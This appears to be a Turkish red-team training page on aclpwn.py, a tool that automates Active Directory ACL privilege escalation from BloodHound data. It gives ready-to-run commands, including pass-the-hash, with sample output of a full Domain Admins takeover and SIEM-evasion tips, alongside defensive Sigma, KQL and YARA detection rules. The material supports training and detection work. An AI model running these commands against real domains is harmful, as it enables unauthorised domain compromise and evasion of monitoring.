# aclpwn.py

> **Kategori:** [9. ACL, GPO ve Nesne Manipülasyonu](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Dirk-jan Mollema (@dirkjanm / Fox-IT) tarafından geliştirilen; BloodHound Neo4j veritabanındaki Active Directory graf verilerini sorgulayarak, saldırganın kontrolündeki bir başlangıç kullanıcısından hedef ayrıcalıklı gruba (Domain Admins) uzanan en kısa ACL yükseltme zincirini bulan, adımları LDAP ve SAMR protokolleri ile otomatik olarak işleten ve değişiklikleri geri alabilen (restore) gelişmiş exploit motoru.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında nesne izinleri (DACL) incelenirken eskalasyon yolları nadiren tek adımlıdır. Genellikle kurumsal ortamlarda çok adımlı, karmaşık ve insan gözüyle takip edilmesi zor izin zincirleri bulunur. Örneğin:
`Kullanıcı A` ──► (`GenericWrite`) ──► `Grup 1` ──► (`MemberOf`) ──► `Grup 2` ──► (`WriteOwner`) ──► `Kullanıcı B` ──► (`ForceChangePassword`) ──► `Kullanıcı B` ──► (`WriteDacl`) ──► `Domain Admins`

BloodHound grafik analiz motoru bu yolları Neo4j veritabanında haritalandırır. Ancak bir operatörün bu grafiği inceleyip her bir adımı manuel olarak PowerView veya bloodyAD ile sırayla işletmesi zaman alıcıdır, komut satırı hatalarına açıktır ve operasyon bittiğinde sistemi eski haline döndürmek (Rollback) büyük bir zorluk teşkil eder.

**`aclpwn.py`**, BloodHound grafiği ile Active Directory operasyonel protokolleri (LDAP ve SAMR) arasında doğrudan köprü kuran akıllı bir otomasyon motorudur. Neo4j REST/Bolt API'si üzerinden Cypher sorguları yürüterek başlangıç düğümü (`from_account`) ile hedef düğüm (`to_account`) arasındaki en kısa yetki eskalasyon yolunu (Dijkstra algoritması) tespit eder. Ardından bu yoldaki tüm zincirleme adımları (`WriteDacl`, `WriteOwner`, `GenericAll`, `AddMember`, `ForceChangePassword`) Impacket motoruyla Active Directory üzerinde otomatik olarak icra eder. En kritik yeteneği ise, yaptığı her değişikliği bir durum dosyasında (`state file`) saklayarak operasyon sonrasında tek komutla tüm ACL değişikliklerini sıfırlayabilmesidir (`--restore`).

### Temel Çalışma Mekanizması

1. **Neo4j Sorgusu (Yol Keşfi):** `bolt://` veya `http://` arabirimi üzerinden Neo4j veritabanına bağlanır. Verilen başlangıç ve hedef hesaplar arasında en kısa ilişki zincirini (`MATCH p=shortestPath(...)`) sorgular.
2. **Saldırı Adımlarının Ayrıştırılması:** Grafikteki kenarlar (Edges) mantıksal saldırı fonksiyonlarına dönüştürülür:
   - `AddMember` ──► LDAP üzerinden hedef gruba kullanıcı ekleme.
   - `GenericAll` / `WriteDacl` ──► Hedef nesneye saldırgan için yeni bir ACE (Access Control Entry) enjekte etme.
   - `WriteOwner` ──► Nesnenin `OwnerSID` değerini saldırgana atama.
   - `ForceChangePassword` ──► SAMR veya LDAP üzerinden parola sıfırlama.
3. **Etkileşimli veya Otomatik İcra:** Operatöre adımları gösterir (`--dry-run`), onay ister veya doğrudan tam otomatik modda (`--auto`) etki alanı denetleyicisine bağlanarak zinciri yürütür.
4. **Durum Kaydı ve Geri Alma (Rollback Engine):** Yapılan her nesne modifikasyonunun eski halini yerel bir JSON dosyasına kaydeder. Operasyon tamamlandığında `--restore` bayrağı ile tüm izinler, grup üyelikleri ve sahiplikler sızma testi öncesindeki orijinal haline döndürülür.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│                   SALDIRGAN LINUX PLATFORMU (ACLPWN)                   │
│                                                                        │
│  [ aclpwn -f jdoe -t "DOMAIN ADMINS@CORP.LOCAL" -d corp.local -a ]     │
│         │                                                              │
│         ├── (1) Neo4j Veritabanı Sorgusu (TCP 7687 Bolt / 7474 HTTP)   │
│         │   └── Cypher: shortestPath((jdoe)-[*]->(Domain Admins))      │
│         │                                                              │
│         ├── (2) Yol Ayrıştırıldı (3 Adımlı Zincir Tespit Edildi):      │
│         │       ├─ Adım 1: Group1 üzerinde AddMember                   │
│         │       ├─ Adım 2: AdminUser üzerinde WriteDacl -> GenericAll  │
│         │       └─ Adım 3: Domain Admins üzerinde AddMember            │
│         │                                                              │
│         ├── (3) Değişiklik Durumu Kaydedilir: aclpwn-state.json        │
│         │                                                              │
│         ├── (4) Impacket LDAP/SAMR Motoru DC'ye Bağlanır (TCP 389/445):│
│         │                                                              │
│         ▼                                                              │
│  [ ACTIVE DIRECTORY ETKİ ALANI DENETLEYİCİSİ (DC01) ]                  │
│         │                                                              │
│         ├── Adım 1 İcra Edildi: jdoe -> Group1 eklendi                 │
│         ├── Adım 2 İcra Edildi: AdminUser DACL güncellendi             │
│         ├── Adım 3 İcra Edildi: jdoe -> Domain Admins eklendi          │
│         │                                                              │
│         ▼                                                              │
│  [ BAŞARILI: jdoe artık Domain Admin Yetkisine Sahip! ]               │
│         │                                                              │
│         └── (5) Test Sonrası İz Temizliği (Rollback):                  │
│                 aclpwn --restore aclpwn-state.json                     │
│                 └── Tüm Değişiklikler Milisaniyeler İçinde Geri Alınır │
└────────────────────────────────────────────────────────────────────────┘
```

### Neden Önemli? Operasyonel Değer

| Operasyonel Senaryo | Manuel Yöntem (BloodHound GUI + PowerView) | aclpwn Yaklaşımı |
|---|---|---|
| **Eskalasyon Hızı** | 5 adımlı bir yolu analiz etmek, komutları yazmak 15-30 dk sürer. | Neo4j'den yolu çeker ve saniyeler içinde tam yetkiyi elde eder. |
| **Operasyonel Hata Riski** | Yanlış nesneye izin yazılması veya şifre sıfırlanması sistemi bozabilir. | Yalnızca grafın doğruladığı matematiksel en kısa yolu işletir. |
| **Geri Alma (Rollback)** | Hangi nesneye hangi ACE'nin eklendiğini hatırlamak ve silmek çok zordur. | Yerleşik `--restore` mekanizması ile sıfır insan hatasıyla tam temizlik sağlar. |
| **Kuru Çalıştırma (Dry-Run)** | Komutların etkisini önceden simüle etmek zordur. | `--dry-run` ile Active Directory'ye dokunmadan çalışacak tüm adımları listeler. |

### Alternatif Araçlarla Karşılaştırma

| Özellik | aclpwn | bloodyAD | StandIn | PowerView |
|---|---|---|---|---|
| **Geliştirme Dili** | Python 3 | Python 3 | C# (.NET) | PowerShell |
| **Neo4j Doğrudan Bağlantısı** | 🟢 Tam Entegre (Cypher API) | 🔴 Yok (Manuel hedefleme) | 🔴 Yok | 🔴 Yok |
| **Otomatik Yol İşletimi** | 🟢 Tek Komutla Uçtan Uca | 🔴 Adım adım manuel komut | 🔴 Manuel komut | 🔴 Manuel komut |
| **Yerleşik Geri Alma (Restore)**| 🟢 Otomatik Durum Dosyası | 🟡 Her komut için `remove` | 🔴 Kısıtlı | 🔴 Manuel komut gerekir |
| **Protokol Desteği** | LDAP & SAMR | Saf LDAP / LDAPS | LDAP / Win32 API | LDAP / ADSI |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

aclpwn, genel bağlantı parametreleri, Neo4j veritabanı ayarları ve icra seçenekleri ile yapılandırılır.

### Genel Sözdizimi

```bash
aclpwn -f <BAŞLANGIÇ_HESABI> -t <HEDEF_HESAP> -d <DOMAIN> [Seçenekler]
```

### Desteklenen Kritik Bayraklar ve Parametreler

| Parametre / Bayrak | Açıklama | Örnek Kullanım |
|---|---|---|
| `-f`, `--from-account` | Saldırganın kontrolünde olan başlangıç nesnesi/kullanıcısı (Zorunlu). | `-f jdoe@corp.local` |
| `-t`, `--to-account` | Ele geçirilmek istenen hedef nesne veya grup (Zorunlu). | `-t "DOMAIN ADMINS@CORP.LOCAL"` |
| `-d`, `--domain` | Hedef Active Directory etki alanı adı. | `-d corp.local` |
| `-dc`, `--domain-controller` | Hedef Etki Alanı Denetleyicisinin IP veya FQDN adresi. | `-dc 10.10.10.1` |
| `-c`, `--credentials` | Başlangıç hesabı için kimlik bilgisi (`KULLANICI:PAROLA` veya `:HASH`). | `-c 'jdoe:Welcome2026!'` |
| `-s`, `--server` | Neo4j veritabanı bağlantı URI adresi (Varsayılan: `bolt://localhost:7687`). | `-s bolt://127.0.0.1:7687` |
| `-u`, `--user` | Neo4j veritabanı kullanıcı adı (Varsayılan: `neo4j`). | `-u neo4j` |
| `-p`, `--password` | Neo4j veritabanı erişim şifresi. | `-p 'Neo4jSecretPass!'` |
| `-a`, `--auto` | Onay sormadan tüm eskalasyon zincirini tam otomatik olarak çalıştırır. | `-a` |
| `-dry`, `--dry-run` | AD üzerinde hiçbir işlem yapmaz; işletilecek komut ve adımları simüle eder. | `--dry-run` |
| `-r`, `--restore` | Daha önce çalıştırılan saldırıyı belirtilen durum dosyası ile geri alır. | `-r aclpwn-20261014.json` |
| `--state-file` | Değişiklik durumunun kaydedileceği özel dosya yolu. | `--state-file /tmp/state.json` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Neo4j'e Bağlanarak En Kısa ACL Yolunu Otomatik Sömürme

Saldırganın elinde standart `jdoe` kullanıcısı vardır. Neo4j veritabanı üzerinden `Domain Admins` grubuna giden en kısa yetki zincirini tam otomatik olarak işletmek:

```bash
aclpwn -f jdoe@corp.local -t "DOMAIN ADMINS@CORP.LOCAL" -d corp.local -dc 10.10.10.1 -c 'jdoe:Welcome2026!' -a
```

**Örnek Konsol Çıktısı Analizi:**

```text
[+] aclpwn.py - Active Directory ACL Exploitation Engine
[+] Connecting to Neo4j database at bolt://localhost:7687...
[+] Connected as 'neo4j'!
[*] Querying shortest path from 'JDOE@CORP.LOCAL' to 'DOMAIN ADMINS@CORP.LOCAL'...
[+] Path found! Length: 3 hops.

Path details:
  [1] (JDOE@CORP.LOCAL) --[GenericWrite]--> (IT-HELPDESK@CORP.LOCAL)
  [2] (IT-HELPDESK@CORP.LOCAL) --[WriteDacl]--> (SVC_BACKUP@CORP.LOCAL)
  [3] (SVC_BACKUP@CORP.LOCAL) --[AddMember]--> (DOMAIN ADMINS@CORP.LOCAL)

[*] Auto-mode enabled. Executing exploitation chain...
[*] Connecting to Domain Controller: 10.10.10.1 (LDAP Port 389/636)...
[+] Authenticated to Active Directory!

[*] Step 1: Adding JDOE to IT-HELPDESK group via GenericWrite...
[+] Step 1 completed successfully! (Saved state)

[*] Step 2: Granting JDOE Full Control (GenericAll) on SVC_BACKUP via WriteDacl...
[+] Step 2 completed successfully! (Saved state)

[*] Step 3: Adding JDOE to 'DOMAIN ADMINS' using SVC_BACKUP permissions...
[+] Step 3 completed successfully! (Saved state)

[+] EXPLOITATION COMPLETE! 'JDOE@CORP.LOCAL' is now a member of 'DOMAIN ADMINS'!
[+] State saved to: aclpwn-20261014-194012.json
[*] Run with --restore to revert all changes.
```

*Çıktı Yorumu:* aclpwn 3 adımlı zinciri saniyeler içinde başarıyla işletmiş, kullanıcıyı Domain Admin yapmış ve tüm değişiklikleri içeren bir geri yükleme (state) dosyası oluşturmuştur.

### Senaryo 2: Kuru Çalıştırma (Dry-Run) Modunda Simülasyon

Etki alanında hiçbir kayıt defteri veya LDAP değişikliği yapmadan önce işletilecek zinciri güvenle incelemek:

```bash
aclpwn -f jdoe@corp.local -t "DOMAIN ADMINS@CORP.LOCAL" -d corp.local -dc 10.10.10.1 -c 'jdoe:Welcome2026!' --dry-run
```

Bu modda araç Neo4j'i sorgular, adımları doğrular, hedef nesnelerin LDAP yollarını çözer ancak etki alanına hiçbir yazma (`MODIFY`) isteği göndermez.

### Senaryo 3: Etkileşimli (Interactive) Onay Modu

Her adımda operatör onayı isteyerek kontrollü ilerleme:

```bash
aclpwn -f jdoe@corp.local -t "DOMAIN ADMINS@CORP.LOCAL" -d corp.local -dc 10.10.10.1 -c 'jdoe:Welcome2026!'
```

Araç her bir adımı (Örn: "DACL üzerine GenericAll yazılacak, onaylıyor musunuz? [Y/n]") operatöre sorar. Operatör `Y` dedikçe bir sonraki adıma geçer.

### Senaryo 4: Operasyon Sonrası İzleri Geri Alma (Rollback / Restore)

Sızma testi tamamlandığında veya yetki alındıktan hemen sonra sisteme yapılan tüm müdahaleleri geri almak:

```bash
aclpwn --restore aclpwn-20261014-194012.json -dc 10.10.10.1 -c 'jdoe:Welcome2026!'
```

**Örnek Konsol Çıktısı:**

```text
[*] Starting restore operation from state file: aclpwn-20261014-194012.json
[*] Connecting to Domain Controller: 10.10.10.1...
[+] Reverting Step 3: Removing JDOE from 'DOMAIN ADMINS'... [OK]
[+] Reverting Step 2: Removing injected ACE from SVC_BACKUP... [OK]
[+] Reverting Step 1: Removing JDOE from IT-HELPDESK... [OK]
[+] RESTORE COMPLETE! All objects restored to their original state.
```

### Senaryo 5: Pass-the-Hash ile aclpwn Çalıştırma

Parola yerine NTLM karması kullanarak zinciri işletme:

```bash
aclpwn -f jdoe@corp.local -t "DOMAIN ADMINS@CORP.LOCAL" -d corp.local -dc 10.10.10.1 -c 'jdoe::31d6cfe0d16ae931b73c59d7e0c089c0' -a
```

### Senaryo 6: Uzak veya Docker Neo4j Sunucusu ile Bağlantı

BloodHound veritabanı farklı bir analiz sunucusunda veya Docker konteynerinde barındırıldığında:

```bash
aclpwn -s bolt://10.10.50.20:7687 -u neo4j -p 'AnalystPass123!' -f jdoe@corp.local -t "DOMAIN ADMINS@CORP.LOCAL" -d corp.local -dc 10.10.10.1 -c 'jdoe:Pass123' -a
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Temel Neden | Kesin Çözüm Adımı |
|---|---|---|
| `Neo4jConnectionError: Unable to connect to Neo4j database` | Neo4j servisi çalışmamaktadır, Bolt portu (7687) kapalıdır veya veritabanı kullanıcı adı/şifresi yanlıştır. | `sudo systemctl status neo4j` ile servis kontrol edilmeli; `-u` ve `-p` bayrakları ile BloodHound'a giriş yapılan şifre doğrulanmalıdır. |
| `No path found between source and target` | Başlangıç kullanıcısı ile hedef grup arasında grafiksel bir ACL yolu yoktur ya da BloodHound veri toplama (SharpHound) eksik yapılmıştır. | SharpHound tüm yöntemlerle (`-c All`) tekrar çalıştırılıp veritabanı güncellenmeli; veya aracı bir kullanıcı/bilgisayar hesabı başlangıç noktası olarak seçilmelidir. |
| `LDAPInsufficientAccessRightsResult: 0x32 (INSUFFICIENT_ACCESS_RIGHTS)` | Yoldaki bir nesne üzerinde beklenen izin gerçekte mevcut değildir (Örn: Nesne `AdminSDHolder` tarafından korunmaktadır). | `AdminCount=1` olan hesaplar ACL miras alımını engeller. Yol üzerindeki spesifik nesne denetlenmeli ve korumalı olmayan alternatif yollar tercih edilmelidir. |
| `Kerberos / SAMR Connection failed (Port 445 / 135 blocked)` | Parola sıfırlama adımı SAMR (SMB Port 445) gerektirir ve güvenlik duvarı bu portu engellemektedir. | Yoldaki parola sıfırlama adımları yerine saf LDAP (Grup ekleme / WriteDacl) yolları tercih edilmeli veya pivot tüneli kurulmalıdır. |
| `RestoreError: Cannot revert modification` | Geri alma işlemi sırasında nesne başka bir yönetici tarafından silinmiş veya harici bir değişiklik görmüştür. | Durum dosyasındaki nesne DN'leri incelenmeli; gerekirse manuel olarak [bloodyAD](./bloodyAD.md) ile nesne temizlenmelidir. |
| `UnicodeDecodeError in object name` | Active Directory nesne adlarında Türkçe (ç, ğ, ı, ö, ş, ü) veya özel karakterler bulunmaktadır. | Python UTF-8 ortam değişkeni ayarlanmalı (`export PYTHONIOENCODING=utf-8`) veya FQDN yerine nesne SID değeri kullanılmalıdır. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
┌────────────────────────────────────────────────────────────────────────┐
│                        GÜRÜLTÜ VE İZ SEVİYESİ                          │
│                                                                        │
│  [ Ağ Portları ]     : 🟡 ORTA (Neo4j TCP 7687, DC LDAP/SMB)           │
│  [ Dizin Günlükleri ]: 🔴 YÜKSEK (Event 5136, 4728, 4724 Peş Peşe)     │
│  [ Zaman Anomalisi ] : 🔴 YÜKSEK (Milisaniyeler içinde zincirleme ACL) │
│  [ Uç Nokta İzi ]    : 🟢 SIFIR (Tamamen ağ seviyesinde yürütülür)     │
└────────────────────────────────────────────────────────────────────────┘
```

### 5.1 Bırakılan İzler (Artifacts & Telemetry)

1. **Domain Controller Dizin Değişiklik Günlükleri (Security Log):**
   - **Event ID 5136 (Directory Service Object Modified):** Birkaç saniye içinde 3-5 farklı nesnenin `nTSecurityDescriptor` özniteliğinin aynı hesap tarafından değiştirilmesi.
   - **Event ID 4728 / 4732 / 4756:** Güvenlik gruplarına (`Domain Admins` vb.) arka arkaya üye ekleme olayları.
   - **Event ID 4724:** Kullanıcı parola sıfırlama telemetrisi.
2. **Karakteristik Saldırı İmzası (Chain Burst):**
   - Bir standart kullanıcının dakikalar içinde hiyerarşik olarak önce bir yardım masası grubuna girmesi, ardından bir servis hesabını devralması ve hemen sonrasında Domain Admin olması SIEM korelasyon kurallarında "İmtiyazlı Hesap Patlaması" (Privilege Burst) alarmı tetikler.

### 5.2 Ağ ve EDR İmzaları

- **Sıfır Uç Nokta İzi:** Saldırı doğrudan Linux'tan DC'ye yöneltildiği için Windows iş istasyonlarında hiçbir süreç çalışmaz.
- **Ağ İmzası:** Saldırgan IP'sinden Domain Controller'a doğru gelen hızlı LDAP ve SMB/SAMR bağlantı dizisi.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araç İçindeki Kullanım |
|---|---|---|
| **T1098** | Account Manipulation | Otomatikleştirilmiş ACL ve sahiplik manipülasyonu. |
| **T1098.001** | Additional Cloud/Domain Roles | Domain Admins grubuna otomatik üyelik ekleme. |
| **T1069.002** | Permission Groups Discovery: Domain Groups | Neo4j üzerinden en kısa eskalasyon yolunun keşfi. |
| **T1078.002** | Valid Accounts: Domain Accounts | Yükseltilen hesapla etki alanı genelinde oturum açma. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Pratiği |
|---|---|
| **Hızlı İcra Anomalisi** | `--auto` modu adımları milisaniyeler içinde icra ederek SIEM'e takılır. Operasyonel gizlilik için etkileşimli modu kullanın ve adımlar arasına zaman (jitter) koyun. |
| **Kalıcı Nesne Kirliliği** | Test biter bitmez mutlaka `--restore` komutunu çalıştırarak durum dosyasındaki tüm değişiklikleri geri alın. |
| **Parola Sıfırlama Riskleri** | Zincirde `ForceChangePassword` adımı varsa, ilgili kullanıcının aktif oturumunu bozmamak için bu adımdan kaçınan alternatif yollar arayın. |
| **Durum Dosyasının Korunması** | Üretilen `aclpwn-*.json` durum dosyasını asla silmeyin; bu dosya temizliğin tek anahtarıdır. |

### 5.5 Savunma Karşılığı: Tespit Kuralları

#### Sigma Kuralı: Zincirleme ACL Manipülasyonu ve Hızlı Grup Yükseltme Tespiti

```yaml
title: Rapid Sequential ACL Modification and Group Addition (aclpwn Pattern)
id: c81249b1-4912-4c20-a912-48910234fe01
status: experimental
description: Detects rapid sequential DACL modifications followed by privileged group addition indicative of automated ACL abuse tools.
author: Modul 11 Security Research
logsource:
  product: windows
  service: security
detection:
  selection_dacl:
    EventID: 5136
    AttributeLDAPDisplayName: 'nTSecurityDescriptor'
  selection_group:
    EventID:
      - 4728
      - 4732
      - 4756
    TargetUserName:
      - 'Domain Admins'
      - 'Enterprise Admins'
  timeframe: 2m
  condition: selection_dacl | count() by SubjectUserName > 2
falsepositives:
  - Complex Active Directory migration scripts executing automated role assignments
level: critical
tags:
  - attack.privilege_escalation
  - attack.t1098
```

#### Microsoft Sentinel KQL Sorgusu: Hızlı Eskalasyon Zinciri Korelasyonu

```kql
// 5 dakika içinde birden fazla nesnede nTSecurityDescriptor değiştirip ardından Domain Admins grubuna üye ekleyen hesaplar
SecurityEvent
| where TimeGenerated > ago(1h)
| where EventID == 5136 and AttributeLDAPDisplayName == "nTSecurityDescriptor"
| summarize DaclModCount = count(), TargetObjects = make_set(tostring(parse_xml(EventData).EventData.Data[4])) by SubjectUserName, bin(TimeGenerated, 5m)
| where DaclModCount >= 2
| join kind=inner (
    SecurityEvent
    | where TimeGenerated > ago(1h)
    | where EventID in (4728, 4732, 4756) and TargetUserName in~ ("Domain Admins", "Enterprise Admins")
    | project GroupAddTime = TimeGenerated, SubjectUserName, AddedMember = MemberName, PrivGroup = TargetUserName
) on SubjectUserName
| project GroupAddTime, SubjectUserName, AddedMember, PrivGroup, DaclModCount, TargetObjects
```

#### YARA Kuralı: aclpwn Python Modülü ve Cypher İmzaları

```yara
rule PostExploit_aclpwn_Engine {
    meta:
        description = "Detects aclpwn automated Active Directory ACL exploitation engine"
        author = "Active Directory Red Team Module 11"
        date = "2026-10-14"
        severity = "Critical"
    strings:
        $s1 = "aclpwn" ascii wide
        $s2 = "shortestPath" ascii
        $s3 = "aclpwn-restore" ascii
        $s4 = "GenericWrite" ascii
        $s5 = "WriteDacl" ascii
        $s6 = "WriteOwner" ascii
    condition:
        all of ($s1, $s2, $s3) or (4 of ($s1, $s4, $s5, $s6))
}
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Neo4j Üzerinden En Kısa Yolu Otomatik Sömürme
```bash
aclpwn -f jdoe@corp.local -t "DOMAIN ADMINS@CORP.LOCAL" -d corp.local -dc 10.10.10.1 -c 'jdoe:Pass123' -a
```
- **Ne Yapar?** Başlangıç kullanıcısı ile Domain Admins arasındaki en kısa yolu bulur ve tüm adımları onay sormadan otomatik yürütür.
- **Ne Zaman Kullanılır?** Hızlı yetki yükseltme ve tam etki alanı ele geçirme senaryolarında.
- **Parametreler:** `-f`: Başlangıç hesabı, `-t`: Hedef grup/hesap, `-a`: Otomatik icra modu.

### Komut 2: Kuru Çalıştırma (Dry-Run) Simülasyonu
```bash
aclpwn -f jdoe@corp.local -t "DOMAIN ADMINS@CORP.LOCAL" -d corp.local -dc 10.10.10.1 -c 'jdoe:Pass123' --dry-run
```
- **Ne Yapar?** Yolu bulur ve AD'de hangi değişikliklerin yapılacağını ekrana listeler ancak hiçbir işlem yapmaz.
- **Ne Zaman Kullanılır?** Saldırı adımlarını önceden planlamak ve risk analizi yapmak için.
- **Parametreler:** `--dry-run`: Salt okuma simülasyon modu.

### Komut 3: Etkileşimli Adım Adım Sömürü
```bash
aclpwn -f jdoe@corp.local -t "DOMAIN ADMINS@CORP.LOCAL" -d corp.local -dc 10.10.10.1 -c 'jdoe:Pass123'
```
- **Ne Yapar?** Her bir ACL değişikliğini yapmadan önce operatörden onay (`[Y/n]`) bekler.
- **Ne Zaman Kullanılır?** Kontrollü ve dikkatli ilerlemek gereken hassas sızma testlerinde.
- **Parametreler:** `-a` bayrağı verilmez (Etkileşimli varsayılandır).

### Komut 4: Değişiklikleri Geri Alma (Restore / Rollback)
```bash
aclpwn --restore aclpwn-20261014-194012.json -dc 10.10.10.1 -c 'jdoe:Pass123'
```
- **Ne Yapar?** Durum dosyasını okuyarak eklenen tüm grup üyeliklerini, DACL girdilerini ve sahiplikleri eski haline döndürür.
- **Ne Zaman Kullanılır?** Sızma testi tamamlandığında kurumsal ortamı temizlemek için.
- **Parametreler:** `--restore`: Geri alma modu ve durum dosyası yolu.

### Komut 5: Pass-the-Hash ile Sömürü
```bash
aclpwn -f jdoe@corp.local -t "DOMAIN ADMINS@CORP.LOCAL" -d corp.local -dc 10.10.10.1 -c 'jdoe::31d6cfe0d16ae931b73c59d7e0c089c0' -a
```
- **Ne Yapar?** Açık parola yerine NTLM hash'i kullanarak LDAP/SAMR oturumu açar ve zinciri işletir.
- **Ne Zaman Kullanılır?** Parolası bilinmeyen yalnızca hash'i bulunan hesaplarla çalışırken.
- **Parametreler:** `-c`: Kullanıcı ve NTLM hash formatı.

### Komut 6: Uzak Neo4j Sunucusu Tanımlama
```bash
aclpwn -s bolt://10.10.20.5:7687 -u neo4j -p 'NeoPass123' -f jdoe@corp.local -t "DOMAIN ADMINS@CORP.LOCAL" -d corp.local -dc 10.10.10.1 -c 'jdoe:Pass' -a
```
- **Ne Yapar?** Yerel Neo4j yerine harici bir sunucudaki BloodHound veritabanını sorgular.
- **Ne Zaman Kullanılır?** Takım halinde çalışırken ortak bir BloodHound sunucusu kullanıldığında.
- **Parametreler:** `-s`: Uzak Neo4j Bolt URI'si.

### Komut 7: Belirli Bir Durum Dosyası Yolu Belirleme
```bash
aclpwn -f jdoe@corp.local -t "DOMAIN ADMINS@CORP.LOCAL" -d corp.local -dc 10.10.10.1 -c 'jdoe:Pass' -a --state-file /opt/loot/my-restore.json
```
- **Ne Yapar?** Değişiklik kayıtlarını varsayılan dizin yerine belirtilen özel dosya yoluna kaydeder.
- **Ne Zaman Kullanılır?** Çoklu senaryolarda durum dosyalarını düzenli arşivlemek için.
- **Parametreler:** `--state-file`: Özel durum dosyası konumu.

### Komut 8: Farklı Hedef Grubu Hedefleme (Enterprise Admins)
```bash
aclpwn -f jdoe@corp.local -t "ENTERPRISE ADMINS@CORP.LOCAL" -d corp.local -dc 10.10.10.1 -c 'jdoe:Pass' -a
```
- **Ne Yapar?** Çoklu domain yapılarında hedef olarak doğrudan orman kök grubu olan Enterprise Admins'i seçer.
- **Ne Zaman Kullanılır?** Tüm orman genelinde en yüksek yetkiye sıçramak istendiğinde.
- **Parametreler:** `-t`: Hedef grup UPN formatı.

### Komut 9: Belirli Bir Kullanıcı Hesabını Hedefleme
```bash
aclpwn -f jdoe@corp.local -t "DA_ADMINISTRATOR@CORP.LOCAL" -d corp.local -dc 10.10.10.1 -c 'jdoe:Pass' -a
```
- **Ne Yapar?** Hedef olarak bir grup yerine doğrudan belirli bir etki alanı yöneticisi kullanıcısını hedefler.
- **Ne Zaman Kullanılır?** Spesifik bir yöneticinin hakları (`GenericAll` veya parola sıfırlama) hedeflendiğinde.
- **Parametreler:** `-t`: Hedef kullanıcı adı.

### Komut 10: Ayrıntılı Loglama ile Hata Ayıklama Modu
```bash
aclpwn -f jdoe@corp.local -t "DOMAIN ADMINS@CORP.LOCAL" -d corp.local -dc 10.10.10.1 -c 'jdoe:Pass' --dry-run --log-file debug.log
```
- **Ne Yapar?** Cypher sorgu detaylarını, ASN.1 LDAP paketlerini ve hata detaylarını `debug.log` dosyasına kaydeder.
- **Ne Zaman Kullanılır?** Yol bulunamadığında veya bağlantı hataları yaşandığında sorunu tespit etmek için.
- **Parametreler:** `--log-file`: Ayrıntılı log dosyası yolu.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [fox-it / aclpwn](https://github.com/fox-it/aclpwn)
- **Dirk-jan Mollema Sunumu:** [Automating Active Directory ACL Exploitation (aclpwn)](https://dirkjanm.io/)
- **BloodHound Dokümantasyonu:** [BloodHound Documentation & Cypher Queries](https://bloodhound.readthedocs.io/)
- **MITRE ATT&CK Referansı:** [T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/)

---

> **Önceki:** [← bloodyAD](./bloodyAD.md) · **Sonraki:** [SharpGPOAbuse →](./SharpGPOAbuse.md)
